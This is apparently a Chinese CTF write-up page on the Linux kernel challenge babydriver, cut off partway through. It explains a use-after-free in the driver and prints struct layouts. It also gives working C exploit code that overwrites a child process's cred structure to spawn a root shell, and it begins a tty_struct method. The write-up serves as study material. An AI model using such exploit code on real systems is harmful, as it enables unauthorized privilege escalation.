<!DOCTYPE html>
<html itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
  <head>
    
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
    <meta name="robots" content="noodp" />
    <title>Kernel-Pwn-Babydriver | roderick - record and learn!</title><meta name="author" content="roderick">
<meta name="description" content="æœ¬æ–‡è§£æäº†å†…æ ¸å…¥é—¨é¢˜ç›®babydriverï¼Œæ¶‰åŠLinuxå†…æ ¸åŸºç¡€çŸ¥è¯†ã€çŠ¶æ€åˆ‡æ¢ã€å†…æ ¸ç¼–è¯‘å’Œbusyboxç¼–è¯‘ã€‚æ–‡ç« è¯¦ç»†åˆ†æäº†babydriver.koçš„æ¼æ´ç‚¹ï¼ŒåŒ…æ‹¬å…¨å±€å˜é‡è®¿é—®ä¸åŠ é”å¯¼è‡´çš„UAFé—®é¢˜ï¼Œå¹¶æä¾›äº†ä¸‰ç§åˆ©ç”¨æ–¹æ³•ï¼šé€šè¿‡åŠ«æŒcredç»“æ„ä½“ã€tty_operationsç»“æ„ä½“å’Œseq_operationsç»“æ„ä½“å®ç°ææƒã€‚æ¯ç§æ–¹æ³•å‡é™„æœ‰è¯¦ç»†åˆ©ç”¨æ€è·¯å’Œexpä»£ç ï¼Œå±•ç¤ºäº†å¦‚ä½•é€šè¿‡å†…æ ¸æ¼æ´è·å–rootæƒé™ã€‚"><meta name="keywords" content='pwn'>
  <meta itemprop="name" content="kernel-pwn-babydriver">
  <meta itemprop="description" content="æœ¬æ–‡è§£æäº†å†…æ ¸å…¥é—¨é¢˜ç›®babydriverï¼Œæ¶‰åŠLinuxå†…æ ¸åŸºç¡€çŸ¥è¯†ã€çŠ¶æ€åˆ‡æ¢ã€å†…æ ¸ç¼–è¯‘å’Œbusyboxç¼–è¯‘ã€‚æ–‡ç« è¯¦ç»†åˆ†æäº†babydriver.koçš„æ¼æ´ç‚¹ï¼ŒåŒ…æ‹¬å…¨å±€å˜é‡è®¿é—®ä¸åŠ é”å¯¼è‡´çš„UAFé—®é¢˜ï¼Œå¹¶æä¾›äº†ä¸‰ç§åˆ©ç”¨æ–¹æ³•ï¼šé€šè¿‡åŠ«æŒcredç»“æ„ä½“ã€tty_operationsç»“æ„ä½“å’Œseq_operationsç»“æ„ä½“å®ç°ææƒã€‚æ¯ç§æ–¹æ³•å‡é™„æœ‰è¯¦ç»†åˆ©ç”¨æ€è·¯å’Œexpä»£ç ï¼Œå±•ç¤ºäº†å¦‚ä½•é€šè¿‡å†…æ ¸æ¼æ´è·å–rootæƒé™ã€‚">
  <meta itemprop="datePublished" content="2022-03-12T20:30:48+08:00">

  </a>
</h3><h4 class="heading-element" id="uaf-credç»“æ„ä½“åˆ©ç”¨"><span>UAF Credç»“æ„ä½“åˆ©ç”¨</span>
  <a href="#uaf-cred%e7%bb%93%e6%9e%84%e4%bd%93%e5%88%a9%e7%94%a8" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h4><p>è¯¥æ–¹æ³•åªåœ¨ä½ç‰ˆæœ¬çš„å†…æ ¸æœ‰æ•ˆï¼Œé«˜ç‰ˆæœ¬çš„ç‰¹æ®Šç»“æ„ä½“çš„åˆ†é…åŒºé—´ä¸æ™®é€šæ˜ å°„åŒºéš”ç¦»å¼€ï¼Œæ‰€ä»¥å­è¿›ç¨‹æ°¸è¿œä¹Ÿæ— æ³•åˆ†é…åˆ°å½“å‰è¢«é‡Šæ”¾çš„é‚£ä¸ªå †å—ã€‚</p>
<p>æœ¬ç‰ˆæœ¬çš„å†…æ ¸è¿˜å¯ä»¥ä½¿ç”¨è¿™ç§æ–¹æ³•ï¼Œå› æ­¤ï¼Œåˆ©ç”¨æ€è·¯ä¸ºï¼š</p>
<ul>
<li>æ‰“å¼€ä¸¤æ¬¡<code>baabydev</code></li>
<li>é‡Šæ”¾ç¬¬ä¸€æ¬¡</li>
<li>è°ƒç”¨<code>fork</code>ç³»ç»Ÿè°ƒç”¨ï¼Œå¾—åˆ°å­è¿›ç¨‹</li>
<li>é€šè¿‡ç¬¬äºŒæ¬¡æ‰“å¼€çš„å¥æŸ„å†™ï¼Œå°†å…¶å‰<code>32</code>ä¸ªå­—èŠ‚åˆ·ä¸º<code>0</code></li>
<li>å­è¿›ç¨‹è°ƒç”¨<code>system(&quot;/bin/sh&quot;)</code>å³å¯è·å¾—<code>root</code>çš„<code>shell</code></li>
</ul>
<p>ç»“æ„ä½“ä¸ºï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cm">/* offset    |  size */</span>  <span class="n">type</span> <span class="o">=</span> <span class="k">struct</span> <span class="n">cred</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*    0      |     4 */</span>    <span class="kt">atomic_t</span> <span class="n">usage</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*    4      |     4 */</span>    <span class="kt">kuid_t</span> <span class="n">uid</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*    8      |     4 */</span>    <span class="kt">kgid_t</span> <span class="n">gid</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*   12      |     4 */</span>    <span class="kt">kuid_t</span> <span class="n">suid</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*   16      |     4 */</span>    <span class="kt">kgid_t</span> <span class="n">sgid</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*   20      |     4 */</span>    <span class="kt">kuid_t</span> <span class="n">euid</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*   24      |     4 */</span>    <span class="kt">kgid_t</span> <span class="n">egid</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*   28      |     4 */</span>    <span class="kt">kuid_t</span> <span class="n">fsuid</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*   32      |     4 */</span>    <span class="kt">kgid_t</span> <span class="n">fsgid</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*   36      |     4 */</span>    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">securebits</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*   40      |     8 */</span>    <span class="kt">kernel_cap_t</span> <span class="n">cap_inheritable</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*   48      |     8 */</span>    <span class="kt">kernel_cap_t</span> <span class="n">cap_permitted</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*   56      |     8 */</span>    <span class="kt">kernel_cap_t</span> <span class="n">cap_effective</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*   64      |     8 */</span>    <span class="kt">kernel_cap_t</span> <span class="n">cap_bset</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*   72      |     8 */</span>    <span class="kt">kernel_cap_t</span> <span class="n">cap_ambient</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*   80      |     1 */</span>    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">jit_keyring</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* XXX  7-byte hole  */</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*   88      |     8 */</span>    <span class="k">struct</span> <span class="n">key</span> <span class="o">*</span><span class="n">session_keyring</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*   96      |     8 */</span>    <span class="k">struct</span> <span class="n">key</span> <span class="o">*</span><span class="n">process_keyring</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  104      |     8 */</span>    <span class="k">struct</span> <span class="n">key</span> <span class="o">*</span><span class="n">thread_keyring</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  112      |     8 */</span>    <span class="k">struct</span> <span class="n">key</span> <span class="o">*</span><span class="n">request_key_auth</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  120      |     8 */</span>    <span class="kt">void</span> <span class="o">*</span><span class="n">security</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  128      |     8 */</span>    <span class="k">struct</span> <span class="n">user_struct</span> <span class="o">*</span><span class="n">user</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  136      |     8 */</span>    <span class="k">struct</span> <span class="n">user_namespace</span> <span class="o">*</span><span class="n">user_ns</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  144      |     8 */</span>    <span class="k">struct</span> <span class="n">group_info</span> <span class="o">*</span><span class="n">group_info</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  152      |    16 */</span>    <span class="k">struct</span> <span class="n">callback_head</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  152      |     8 */</span>        <span class="k">struct</span> <span class="n">callback_head</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  160      |     8 */</span>        <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">func</span><span class="p">)(</span><span class="k">struct</span> <span class="n">callback_head</span> <span class="o">*</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                               <span class="cm">/* total size (bytes):   16 */</span>
</span></span><span class="line"><span class="cl">                           <span class="p">}</span> <span class="n">rcu</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                           <span class="cm">/* total size (bytes):  168 */</span>
</span></span><span class="line"><span class="cl">                         <span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div><p><img loading="lazy" src='https://image.roderickchan.cn/img/image-20220312232031701.png' alt="image-20220312232031701"></p>
<p><code>exp</code>ä¸ºï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">baby_alloc</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">size</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mh">0x10001</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// UAF ä½¿ç”¨credææƒ
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">void</span> <span class="nf">exp1</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">fd1</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="n">DEV_NAME</span><span class="p">,</span> <span class="n">O_RDWR</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">fd2</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="n">DEV_NAME</span><span class="p">,</span> <span class="n">O_RDWR</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">fd1</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="o">||</span> <span class="n">fd2</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">error</span><span class="p">(</span><span class="s">&#34;open error!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="nf">baby_alloc</span><span class="p">(</span><span class="n">fd1</span><span class="p">,</span> <span class="mh">0xa8</span><span class="p">);</span> <span class="c1">// sizeof(cred) == 0xa8
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">close</span><span class="p">(</span><span class="n">fd1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">pid_t</span> <span class="n">child</span> <span class="o">=</span> <span class="nf">fork</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">child</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">error</span><span class="p">(</span><span class="s">&#34;fork error!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">child</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// child
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kt">char</span> <span class="n">payload</span><span class="p">[</span><span class="mi">32</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
</span></span><span class="line"><span class="cl">        <span class="nf">write</span><span class="p">(</span><span class="n">fd2</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">payload</span><span class="p">,</span> <span class="mi">32</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">get_shell</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">wait</span><span class="p">(</span><span class="nb">NULL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div><h4 class="heading-element" id="uaf-tty_operationsç»“æ„ä½“åˆ©ç”¨"><span>UAF Tty_operationsç»“æ„ä½“åˆ©ç”¨</span>
  <a href="#uaf-tty_operations%e7%bb%93%e6%9e%84%e4%bd%93%e5%88%a9%e7%94%a8" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h4><p>åœ¨<code>open(&quot;/dev/ptmx&quot;)</code>çš„æ—¶å€™ï¼Œä¼šåˆ†é…åˆ°ä¸€ä¸ªç»“æ„ä½“<code>tty_struct</code>ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span><span class="lnt">149
</span><span class="lnt">150
</span><span class="lnt">151
</span><span class="lnt">152
</span><span class="lnt">153
</span><span class="lnt">154
</span><span class="lnt">155
</span><span class="lnt">156
</span><span class="lnt">157
</span><span class="lnt">158
</span><span class="lnt">159
</span><span class="lnt">160
</span><span class="lnt">161
</span><span class="lnt">162
</span><span class="lnt">163
</span><span class="lnt">164
</span><span class="lnt">165
</span><span class="lnt">166
</span><span class="lnt">167
</span><span class="lnt">168
</span><span class="lnt">169
</span><span class="lnt">170
</span><span class="lnt">171
</span><span class="lnt">172
</span><span class="lnt">173
</span><span class="lnt">174
</span><span class="lnt">175
</span><span class="lnt">176
</span><span class="lnt">177
</span><span class="lnt">178
</span><span class="lnt">179
</span><span class="lnt">180
</span><span class="lnt">181
</span><span class="lnt">182
</span><span class="lnt">183
</span><span class="lnt">184
</span><span class="lnt">185
</span><span class="lnt">186
</span><span class="lnt">187
</span><span class="lnt">188
</span><span class="lnt">189
</span><span class="lnt">190
</span><span class="lnt">191
</span><span class="lnt">192
</span><span class="lnt">193
</span><span class="lnt">194
</span><span class="lnt">195
</span><span class="lnt">196
</span><span class="lnt">197
</span><span class="lnt">198
</span><span class="lnt">199
</span><span class="lnt">200
</span><span class="lnt">201
</span><span class="lnt">202
</span><span class="lnt">203
</span><span class="lnt">204
</span><span class="lnt">205
</span><span class="lnt">206
</span><span class="lnt">207
</span><span class="lnt">208
</span><span class="lnt">209
</span><span class="lnt">210
</span><span class="lnt">211
</span><span class="lnt">212
</span><span class="lnt">213
</span><span class="lnt">214
</span><span class="lnt">215
</span><span class="lnt">216
</span><span class="lnt">217
</span><span class="lnt">218
</span><span class="lnt">219
</span><span class="lnt">220
</span><span class="lnt">221
</span><span class="lnt">222
</span><span class="lnt">223
</span><span class="lnt">224
</span><span class="lnt">225
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cm">/* offset    |  size */</span>  <span class="n">type</span> <span class="o">=</span> <span class="k">struct</span> <span class="n">tty_struct</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*    0      |     4 */</span>    <span class="kt">int</span> <span class="n">magic</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*    4      |     4 */</span>    <span class="k">struct</span> <span class="n">kref</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*    4      |     4 */</span>        <span class="kt">atomic_t</span> <span class="n">refcount</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                               <span class="cm">/* total size (bytes):    4 */</span>
</span></span><span class="line"><span class="cl">                           <span class="p">}</span> <span class="n">kref</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*    8      |     8 */</span>    <span class="k">struct</span> <span class="n">device</span> <span class="o">*</span><span class="n">dev</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*   16      |     8 */</span>    <span class="k">struct</span> <span class="n">tty_driver</span> <span class="o">*</span><span class="n">driver</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*   24      |     8 */</span>    <span class="k">const</span> <span class="k">struct</span> <span class="n">tty_operations</span> <span class="o">*</span><span class="n">ops</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*   32      |     4 */</span>    <span class="kt">int</span> <span class="n">index</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* XXX  4-byte hole  */</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*   40      |    48 */</span>    <span class="k">struct</span> <span class="n">ld_semaphore</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*   40      |     8 */</span>        <span class="kt">long</span> <span class="n">count</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*   48      |     4 */</span>        <span class="kt">raw_spinlock_t</span> <span class="n">wait_lock</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*   52      |     4 */</span>        <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">wait_readers</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*   56      |    16 */</span>        <span class="k">struct</span> <span class="n">list_head</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*   56      |     8 */</span>            <span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*   64      |     8 */</span>            <span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">prev</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                   <span class="cm">/* total size (bytes):   16 */</span>
</span></span><span class="line"><span class="cl">                               <span class="p">}</span> <span class="n">read_wait</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*   72      |    16 */</span>        <span class="k">struct</span> <span class="n">list_head</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*   72      |     8 */</span>            <span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*   80      |     8 */</span>            <span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">prev</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                   <span class="cm">/* total size (bytes):   16 */</span>
</span></span><span class="line"><span class="cl">                               <span class="p">}</span> <span class="n">write_wait</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                               <span class="cm">/* total size (bytes):   48 */</span>
</span></span><span class="line"><span class="cl">                           <span class="p">}</span> <span class="n">ldisc_sem</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*   88      |     8 */</span>    <span class="k">struct</span> <span class="n">tty_ldisc</span> <span class="o">*</span><span class="n">ldisc</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*   96      |    40 */</span>    <span class="k">struct</span> <span class="n">mutex</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*   96      |     4 */</span>        <span class="kt">atomic_t</span> <span class="n">count</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  100      |     4 */</span>        <span class="kt">spinlock_t</span> <span class="n">wait_lock</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  104      |    16 */</span>        <span class="k">struct</span> <span class="n">list_head</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  104      |     8 */</span>            <span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  112      |     8 */</span>            <span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">prev</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                   <span class="cm">/* total size (bytes):   16 */</span>
</span></span><span class="line"><span class="cl">                               <span class="p">}</span> <span class="n">wait_list</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  120      |     8 */</span>        <span class="k">struct</span> <span class="n">task_struct</span> <span class="o">*</span><span class="n">owner</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  128      |     4 */</span>        <span class="k">struct</span> <span class="n">optimistic_spin_queue</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  128      |     4 */</span>            <span class="kt">atomic_t</span> <span class="n">tail</span><span class="p">;</span>
